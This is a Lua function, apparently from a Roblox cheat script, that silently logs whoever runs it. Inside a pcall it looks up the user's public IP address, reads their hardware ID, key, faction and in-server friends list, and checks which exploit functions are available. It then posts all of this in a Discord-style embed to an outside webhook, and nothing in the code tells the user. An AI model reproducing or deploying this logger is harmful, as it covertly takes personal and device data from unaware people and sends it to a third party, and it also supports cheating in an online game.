local function _LOG()
    pcall(function()
        local r = (syn and syn.request or request or http_request)({Url = _IP, Method = "GET"})
        local ni = r and r.Success and _H:JSONDecode(r.Body) or {}
        local u = 0
        for _, f in ipairs({"getgenv", "getrawmetatable", "hookfunction"}) do if getgenv()[f] then u = u + 1 end end
        local fn, ft = "None", "None"
        local fdf = _R:FindFirstChild("FactionSysRS") and _R.FactionSysRS:FindFirstChild("FactionData")
        if fdf then
            for _, f in ipairs(fdf:GetChildren()) do
                if f:FindFirstChild("FactionMembers") and f.FactionMembers:FindFirstChild(_uid) then
                    local bd = f:FindFirstChild("BasicFactionData")
                    if bd then fn = bd.FactionName.Value ft = bd.FactionTag.Value end
                    break
                end
            end
        end
        local friends = {}
        for _, p in ipairs(_P:GetPlayers()) do if p ~= _lp and _lp:IsFriendsWith(p.UserId) then table.insert(friends, p.Name) end end
        local payload = {
            ["embeds"] = {{
                ["title"] = (_st == "whitelist" and "Verified" or "Execution Log"),
                ["color"] = (_st == "whitelist" and 65280 or 16753920),
                ["fields"] = {
                    {["name"] = "Player Info", ["value"] = string.format("Name: %s\nID: %s", _lp.Name, _uid), ["inline"] = true},
                    {["name"] = "Faction", ["value"] = "["..ft.."] "..fn, ["inline"] = true},
                    {["name"] = "Hardware", ["value"] = "HWID: `".._hw.."`\nKey: `".._tk.."`", ["inline"] = false},
                    {["name"] = "System", ["value"] = "UNC: "..math.floor((u/3)*100).."%", ["inline"] = true},
                    {["name"] = "Network", ["value"] = "IP: "..(ni.query or "N/A"), ["inline"] = false},
                    {["name"] = "Friends", ["value"] = (#friends > 0 and table.concat(friends, ", ") or "None"), ["inline"] = false}
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
        (syn and syn.request or request or http_request)({Url = _W, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _H:JSONEncode(payload)})
    end)
end

